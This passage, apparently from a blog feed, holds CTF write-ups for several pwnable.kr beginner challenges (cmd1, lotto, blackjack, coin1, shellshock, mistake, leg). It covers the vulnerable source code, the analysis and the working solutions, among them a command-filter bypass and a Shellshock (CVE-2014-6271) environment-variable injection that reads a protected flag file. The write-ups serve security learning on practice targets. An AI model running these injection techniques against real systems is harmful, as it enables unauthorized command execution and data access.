<span class="number">0</span>;</span><br><span class="line">	system( argv[<span class="number">1</span>] );</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>注意到：其中对输入的命令进行了过滤，去除了sh，tmp，flag字符</p><ol><li><p>cat方法<br>使用f*代替flag</p></li><li><p>grep方法<br>同上使用通配符</p></li><li><p>环境变量方法<br>建立环境变量，值为flag</p></li></ol><p>除此之外还可以有软链接，执行另一文件等</p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cmd1@ubuntu:~$ ./cmd1 "/bin/cat f*"</span><br><span class="line">mommy now I get what PATH environment is for :)</span><br><span class="line">cmd1@ubuntu:~$ ./cmd1 "/bin/grep -Rn :"</span><br><span class="line">Binary file cmd1 matches</span><br><span class="line">flag:1:mommy now I get what PATH environment is for :)</span><br><span class="line">/bin/grep: .bash_history: Permission denied</span><br><span class="line">cmd1@ubuntu:~$ export f=flag</span><br><span class="line">cmd1@ubuntu:~$ ./cmd1 "/bin/cat \$f"</span><br><span class="line">mommy now I get what PATH environment is for :)</span><br></pre></td></tr></table></figure><p><code>flag</code>：<code>mommy now I get what PATH environment is for :)</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— lotto</title>
    <url>/ca309fdf.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Mommy! I made a lotto program for my homework.</span><br><span class="line">do you want to play?</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ssh lotto@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><p>题目要求我们使用ssh登录到服务器上<code>ssh lotto@pwnable.kr -p2222</code>，密码是<code>guest</code>,有的时候可能有身份的校验，这个时候需要加上参数<code>-o StrictHostKeyChecking=no</code>进行登录</p><a id="more"></a><h2><span id="plotto-c">lotto.c</span><a href="#plotto-c" class="header-anchor">#</a></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> submit[<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">play</span><span class="params">()</span></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Submit your 6 lotto bytes : "</span>);</span><br><span class="line">	fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> r;</span><br><span class="line">	r = <span class="built_in">read</span>(<span class="number">0</span>, submit, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Lotto Start!\n"</span>);</span><br><span class="line">	<span class="comment">//sleep(1);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// generate lotto numbers</span></span><br><span class="line">	<span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">"/dev/urandom"</span>, O_RDONLY);</span><br><span class="line">	<span class="keyword">if</span>(fd==<span class="number">-1</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"error. tell admin\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> lotto[<span class="number">6</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">read</span>(fd, lotto, <span class="number">6</span>) != <span class="number">6</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"error2. tell admin\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line">		lotto[i] = (lotto[i] % <span class="number">45</span>) + <span class="number">1</span>;		<span class="comment">// 1 ~ 45</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">close</span>(fd);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// calculate lotto score</span></span><br><span class="line">	<span class="keyword">int</span> match = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;<span class="number">6</span>; j++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(lotto[i] == submit[j])&#123;</span><br><span class="line">				match++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// win!</span></span><br><span class="line">	<span class="keyword">if</span>(match == <span class="number">6</span>)&#123;</span><br><span class="line">		system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"bad luck...\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">help</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"- nLotto Rule -\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"nlotto is consisted with 6 random natural numbers less than 46\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"your goal is to match lotto numbers as many as you can\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"if you win lottery for *1st place*, you will get reward\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"for more details, follow the link below\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"mathematical chance to win this game is known to be 1/8145060.\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// menu</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> menu;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"- Select Menu -\n"</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"1. Play Lotto\n"</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"2. Help\n"</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"3. Exit\n"</span>);</span><br><span class="line"></span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;menu);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">switch</span>(menu)&#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">				play();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">				help();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"bye\n"</span>);</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"invalid menu\n"</span>);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>注意到：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for(i&#x3D;0; i&lt;6; i++)&#123;</span><br><span class="line">	for(j&#x3D;0; j&lt;6; j++)&#123;</span><br><span class="line">		if(lotto[i] &#x3D;&#x3D; submit[j])&#123;</span><br><span class="line">			match++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>循环中，只要自己输入的submit[j] 6个都相同，那么只要与某个lotto[i]一致，就可以破除，所以看下ascii码在1-45中的某个字符尝试输入几次即可</p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><p>使用’++++++'输入</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Submit your 6 lotto bytes : ++++++</span><br><span class="line">Lotto Start!</span><br><span class="line">sorry mom... I FORGOT to check duplicate numbers... :(</span><br></pre></td></tr></table></figure><p><code>flag</code>：<code>sorry mom... I FORGOT to check duplicate numbers... :(</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— blackjack</title>
    <url>/1c0d597c.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Hey! check out this C implementation of blackjack game!</span><br><span class="line">I found it online</span><br><span class="line">* http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html</span><br><span class="line"></span><br><span class="line">I like to give my flags to millionares.</span><br><span class="line">how much money you got?</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Running at : nc pwnable.kr 9009</span><br></pre></td></tr></table></figure><a id="more"></a><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int betting() &#x2F;&#x2F;Asks user amount to bet</span><br><span class="line">&#123;</span><br><span class="line"> printf(&quot;\n\nEnter Bet: $&quot;);</span><br><span class="line"> scanf(&quot;%d&quot;, &amp;bet);</span><br><span class="line"> </span><br><span class="line"> if (bet &gt; cash) &#x2F;&#x2F;If player tries to bet more money than player has</span><br><span class="line"> &#123;</span><br><span class="line">        printf(&quot;\nYou cannot bet more money than you have.&quot;);</span><br><span class="line">        printf(&quot;\nEnter Bet: &quot;);</span><br><span class="line">        scanf(&quot;%d&quot;, &amp;bet);</span><br><span class="line">        return bet;</span><br><span class="line"> &#125;</span><br><span class="line"> else return bet;</span><br><span class="line">&#125; &#x2F;&#x2F; End Function</span><br></pre></td></tr></table></figure><p>可以看到当输入bet后，会与cash比较，数了以后<code>cash=cash-bet</code><br>那么输入一个大的负数，并且输掉应该就可以了</p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><p>输入bet：-100000000，然后选择Stay输掉，再进入下一场即可获得flag</p><p><code>flag</code>：<code>YaY_I_AM_A_MILLIONARE_LOL</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— coin1</title>
    <url>/6060be05.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Mommy, I wanna play a game!</span><br><span class="line">(if your network response time is too slow, try nc 0 9007 inside pwnable.kr server)</span><br><span class="line"></span><br><span class="line">Running at : nc pwnable.kr 9007</span><br></pre></td></tr></table></figure><a id="more"></a><h2><span id="pgame">game</span><a href="#pgame" class="header-anchor">#</a></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">	-              Shall we play a game?              -</span><br><span class="line">	---------------------------------------------------</span><br><span class="line">	</span><br><span class="line">	You have given some gold coins in your hand</span><br><span class="line">	however, there is one counterfeit coin among them</span><br><span class="line">	counterfeit coin looks exactly same as real coin</span><br><span class="line">	however, its weight is different from real one</span><br><span class="line">	real coin weighs 10, counterfeit coin weighes 9</span><br><span class="line">	help me to find the counterfeit coin with a scale</span><br><span class="line">	if you find 100 counterfeit coins, you will get reward :)</span><br><span class="line">	FYI, you have 60 seconds.</span><br><span class="line">	</span><br><span class="line">	- How to play - </span><br><span class="line">	1. you get a number of coins (N) and number of chances (C)</span><br><span class="line">	2. then you specify a set of index numbers of coins to be weighed</span><br><span class="line">	3. you get the weight information</span><br><span class="line">	4. 2~3 repeats C time, then you give the answer</span><br><span class="line">	</span><br><span class="line">	- Example -</span><br><span class="line">	[Server] N=4 C=2 	# find counterfeit among 4 coins with 2 trial</span><br><span class="line">	[Client] 0 1 		# weigh first and second coin</span><br><span class="line">	[Server] 20			# scale result : 20</span><br><span class="line">	[Client] 3			# weigh fourth coin</span><br><span class="line">	[Server] 10			# scale result : 10</span><br><span class="line">	[Client] 2 			# counterfeit coin is third!</span><br><span class="line">	[Server] Correct!</span><br><span class="line"></span><br><span class="line">	- Ready? starting in 3 sec... -</span><br><span class="line">	</span><br><span class="line">N=441 C=9</span><br></pre></td></tr></table></figure><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>就是写脚本交互计算一下</p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><p>脚本如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">def get_weight(begin,end):</span><br><span class="line">        message &#x3D; &quot;&quot;</span><br><span class="line">        if(begin &#x3D;&#x3D; end):</span><br><span class="line">                ssh.sendline(str(begin))</span><br><span class="line">        else:</span><br><span class="line">                for i in range(begin,end + 1):</span><br><span class="line">                        message &#x3D; message + str(i)+&quot; &quot;</span><br><span class="line">                ssh.sendline(message)</span><br><span class="line">        weight &#x3D; ssh.recvline()</span><br><span class="line">        return int(weight)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_result(N,C):</span><br><span class="line">        begin &#x3D; 0</span><br><span class="line">        end &#x3D; N-1</span><br><span class="line">        for i in range(0,C):</span><br><span class="line">                weight &#x3D; get_weight(begin,int(begin+(end-begin)&#x2F;2))</span><br><span class="line">                if(weight%10!&#x3D;0):</span><br><span class="line">                        end &#x3D; int(begin+(end-begin)&#x2F;2)</span><br><span class="line">                else:</span><br><span class="line">                        begin &#x3D; int(begin+(end-begin)&#x2F;2)+1</span><br><span class="line">        ssh.sendline(str(end))</span><br><span class="line">        result &#x3D; ssh.recvline()</span><br><span class="line">        print(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ssh &#x3D; remote(&#39;0&#39;,9007)</span><br><span class="line">print(ssh.recv())</span><br><span class="line">for i in range(0,100):</span><br><span class="line">        print(&quot;begin to process the %d th&quot;%i)</span><br><span class="line">        question &#x3D; ssh.recvline()</span><br><span class="line">        N &#x3D; int(question.split(&quot; &quot;)[0].split(&quot;&#x3D;&quot;)[1])</span><br><span class="line">        C &#x3D; int(question.split(&quot; &quot;)[1].split(&quot;&#x3D;&quot;)[1])</span><br><span class="line">        print N,C</span><br><span class="line">        get_result(N,C)</span><br><span class="line">print ssh.recvline()</span><br><span class="line">print ssh.recvline()</span><br></pre></td></tr></table></figure><p>连上去速度略慢，所以可以scp到pwnable.kr服务器再运行脚本<code>scp -P 2222 coin.py fd@pwnable.kr:/tmp</code></p><p><code>flag</code>：<code>b1NaRy_S34rch1nG_1s_3asy_p3asy</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— shellshock</title>
    <url>/7a715b77.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Mommy, there was a shocking news about bash.</span><br><span class="line">I bet you already know, but lets just make it sure :)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ssh shellshock@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><p>题目要求我们使用ssh登录到服务器上<code>ssh shellshock@pwnable.kr -p2222</code>，密码是<code>guest</code>,有的时候可能有身份的校验，这个时候需要加上参数<code>-o StrictHostKeyChecking=no</code>进行登录</p><a id="more"></a><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>题目里说了是利用shellshcok漏洞</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shellshock@ubuntu:~$ ls -lth</span><br><span class="line">total 960K</span><br><span class="line">-r-xr-sr-x 1 root shellshock_pwn 8.4K Oct 12  2014 shellshock</span><br><span class="line">-r--r--r-- 1 root root            188 Oct 12  2014 shellshock.c</span><br><span class="line">-r--r----- 1 root shellshock_pwn   47 Oct 12  2014 flag</span><br><span class="line">-r-xr-xr-x 1 root shellshock     937K Oct 12  2014 bash</span><br></pre></td></tr></table></figure><p>权限如上，用shellshock的POC看下是否存在漏洞</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shellshock@ubuntu:~$ env x='() &#123; :;&#125;; echo vulnerable' ./bash -c "echo test"</span><br><span class="line">vulnerable</span><br><span class="line">test</span><br></pre></td></tr></table></figure><p>说明存在</p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shellshock@ubuntu:~$ env x='() &#123; :;&#125;; bash -c "cat flag"' ./shellshock </span><br><span class="line">only if I knew CVE-2014-6271 ten years ago..!!</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure><p><code>flag</code>：<code>only if I knew CVE-2014-6271 ten years ago..!!</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— mistake</title>
    <url>/5488b1c2.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">We all make mistakes, let&#39;s move on.</span><br><span class="line">(don&#39;t take this too seriously, no fancy hacking skill is required at all)</span><br><span class="line"></span><br><span class="line">This task is based on real event</span><br><span class="line">Thanks to dhmonkey</span><br><span class="line"></span><br><span class="line">hint : operator priority</span><br><span class="line"></span><br><span class="line">ssh mistake@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><p>题目要求我们使用ssh登录到服务器上<code>ssh mistake@pwnable.kr -p2222</code>，密码是<code>guest</code>,有的时候可能有身份的校验，这个时候需要加上参数<code>-o StrictHostKeyChecking=no</code>进行登录</p><a id="more"></a><h2><span id="pmistake-c">mistake.c</span><a href="#pmistake-c" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line"></span><br><span class="line">#define PW_LEN 10</span><br><span class="line">#define XORKEY 1</span><br><span class="line"></span><br><span class="line">void xor(char* s, int len)&#123;</span><br><span class="line">	int i;</span><br><span class="line">	for(i&#x3D;0; i&lt;len; i++)&#123;</span><br><span class="line">		s[i] ^&#x3D; XORKEY;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[])&#123;</span><br><span class="line">	</span><br><span class="line">	int fd;</span><br><span class="line">	if(fd&#x3D;open(&quot;&#x2F;home&#x2F;mistake&#x2F;password&quot;,O_RDONLY,0400) &lt; 0)&#123;</span><br><span class="line">		printf(&quot;can&#39;t open password %d\n&quot;, fd);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	printf(&quot;do not bruteforce...\n&quot;);</span><br><span class="line">	sleep(time(0)%20);</span><br><span class="line"></span><br><span class="line">	char pw_buf[PW_LEN+1];</span><br><span class="line">	int len;</span><br><span class="line">	if(!(len&#x3D;read(fd,pw_buf,PW_LEN) &gt; 0))&#123;</span><br><span class="line">		printf(&quot;read error\n&quot;);</span><br><span class="line">		close(fd);</span><br><span class="line">		return 0;		</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	char pw_buf2[PW_LEN+1];</span><br><span class="line">	printf(&quot;input password : &quot;);</span><br><span class="line">	scanf(&quot;%10s&quot;, pw_buf2);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; xor your input</span><br><span class="line">	xor(pw_buf2, 10);</span><br><span class="line"></span><br><span class="line">	if(!strncmp(pw_buf, pw_buf2, PW_LEN))&#123;</span><br><span class="line">		printf(&quot;Password OK\n&quot;);</span><br><span class="line">		system(&quot;&#x2F;bin&#x2F;cat flag\n&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">		printf(&quot;Wrong Password\n&quot;);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	close(fd);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>只是两次输入异或操作然后比较？<br>输入<code>0000000000</code>再输入<code>11111111111</code>即可</p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mistake@ubuntu:~$ .&#x2F;mistake </span><br><span class="line">do not bruteforce...</span><br><span class="line">0000000000</span><br><span class="line">input password : 1111111111</span><br><span class="line">Password OK</span><br><span class="line">Mommy, the operator priority always confuses me :(</span><br></pre></td></tr></table></figure><p><code>flag</code>：<code>Mommy, the operator priority always confuses me :(</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— leg</title>
    <url>/232eb954.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Daddy told me I should study arm.</span><br><span class="line">But I prefer to study my leg!</span><br><span class="line"></span><br><span class="line">Download : http:&#x2F;&#x2F;pwnable.kr&#x2F;bin&#x2F;leg.c</span><br><span class="line">Download : http:&#x2F;&#x2F;pwnable.kr&#x2F;bin&#x2F;leg.asm</span><br><span class="line"></span><br><span class="line">ssh leg@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><p>题目要求我们使用ssh登录到服务器上<code>ssh leg@pwnable.kr -p2222</code>，密码是<code>guest</code>,有的时候可能有身份的校验，这个时候需要加上参数<code>-o StrictHostKeyChecking=no</code>进行登录</p><a id="more"></a><h2><span id="pleg-c">leg.c</span><a href="#pleg-c" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">int key1()&#123;</span><br><span class="line">	asm(&quot;mov r3, pc\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">int key2()&#123;</span><br><span class="line">	asm(</span><br><span class="line">	&quot;push	&#123;r6&#125;\n&quot;</span><br><span class="line">	&quot;add	r6, pc, $1\n&quot;</span><br><span class="line">	&quot;bx	r6\n&quot;</span><br><span class="line">	&quot;.code   16\n&quot;</span><br><span class="line">	&quot;mov	r3, pc\n&quot;</span><br><span class="line">	&quot;add	r3, $0x4\n&quot;</span><br><span class="line">	&quot;push	&#123;r3&#125;\n&quot;</span><br><span class="line">	&quot;pop	&#123;pc&#125;\n&quot;</span><br><span class="line">	&quot;.code	32\n&quot;</span><br><span class="line">	&quot;pop	&#123;r6&#125;\n&quot;</span><br><span class="line">	);</span><br><span class="line">&#125;</span><br><span class="line">int key3()&#123;</span><br><span class="line">	asm(&quot;mov r3, lr\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">	int key&#x3D;0;</span><br><span class="line">	printf(&quot;Daddy has very strong arm! : &quot;);</span><br><span class="line">	scanf(&quot;%d&quot;, &amp;key);</span><br><span class="line">	if( (key1()+key2()+key3()) &#x3D;&#x3D; key )&#123;</span><br><span class="line">		printf(&quot;Congratz!\n&quot;);</span><br><span class="line">		int fd &#x3D; open(&quot;flag&quot;, O_RDONLY);</span><br><span class="line">		char buf[100];</span><br><span class="line">		int r &#x3D; read(fd, buf, 100);</span><br><span class="line">		write(0, buf, r);</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">		printf(&quot;I have strong leg :P\n&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="pleg-asm">leg.asm</span><a href="#pleg-asm" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) disass main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x00008d3c &lt;+0&gt;:	push	&#123;r4, r11, lr&#125;</span><br><span class="line">   0x00008d40 &lt;+4&gt;:	add	r11, sp, #8</span><br><span class="line">   0x00008d44 &lt;+8&gt;:	sub	sp, sp, #12</span><br><span class="line">   0x00008d48 &lt;+12&gt;:	mov	r3, #0</span><br><span class="line">   0x00008d4c &lt;+16&gt;:	str	r3, [r11, #-16]</span><br><span class="line">   0x00008d50 &lt;+20&gt;:	ldr	r0, [pc, #104]	; 0x8dc0 &lt;main+132&gt;</span><br><span class="line">   0x00008d54 &lt;+24&gt;:	bl	0xfb6c &lt;printf&gt;</span><br><span class="line">   0x00008d58 &lt;+28&gt;:	sub	r3, r11, #16</span><br><span class="line">   0x00008d5c &lt;+32&gt;:	ldr	r0, [pc, #96]	; 0x8dc4 &lt;main+136&gt;</span><br><span class="line">   0x00008d60 &lt;+36&gt;:	mov	r1, r3</span><br><span class="line">   0x00008d64 &lt;+40&gt;:	bl	0xfbd8 &lt;__isoc99_scanf&gt;</span><br><span class="line">   0x00008d68 &lt;+44&gt;:	bl	0x8cd4 &lt;key1&gt;</span><br><span class="line">   0x00008d6c &lt;+48&gt;:	mov	r4, r0</span><br><span class="line">   0x00008d70 &lt;+52&gt;:	bl	0x8cf0 &lt;key2&gt;</span><br><span class="line">   0x00008d74 &lt;+56&gt;:	mov	r3, r0</span><br><span class="line">   0x00008d78 &lt;+60&gt;:	add	r4, r4, r3</span><br><span class="line">   0x00008d7c &lt;+64&gt;:	bl	0x8d20 &lt;key3&gt;</span><br><span class="line">   0x00008d80 &lt;+68&gt;:	mov	r3, r0</span><br><span class="line">   0x00008d84 &lt;+72&gt;:	add	r2, r4, r3</span><br><span class="line">   0x00008d88 &lt;+76&gt;:	ldr	r3, [r11, #-16]</span><br><span class="line">   0x00008d8c &lt;+80&gt;:	cmp	r2, r3</span><br><span class="line">   0x00008d90 &lt;+84&gt;:	bne	0x8da8 &lt;main+108&gt;</span><br><span class="line">   0x00008d94 &lt;+88&gt;:	ldr	r0, [pc, #44]	; 0x8dc8 &lt;main+140&gt;</span><br><span class="line">   0x00008d98 &lt;+92&gt;:	bl	0x1050c &lt;puts&gt;</span><br><span class="line">   0x00008d9c &lt;+96&gt;:	ldr	r0, [pc, #40]	; 0x8dcc &lt;main+144&gt;</span><br><span class="line">   0x00008da0 &lt;+100&gt;:	bl	0xf89c &lt;system&gt;</span><br><span class="line">   0x00008da4 &lt;+104&gt;:	b	0x8db0 &lt;main+116&gt;</span><br><span class="line">   0x00008da8 &lt;+108&gt;:	ldr	r0, [pc, #32]	; 0x8dd0 &lt;main+148&gt;</span><br><span class="line">   0x00008dac &lt;+112&gt;:	bl	0x1050c &lt;puts&gt;</span><br><span class="line">   0x00008db0 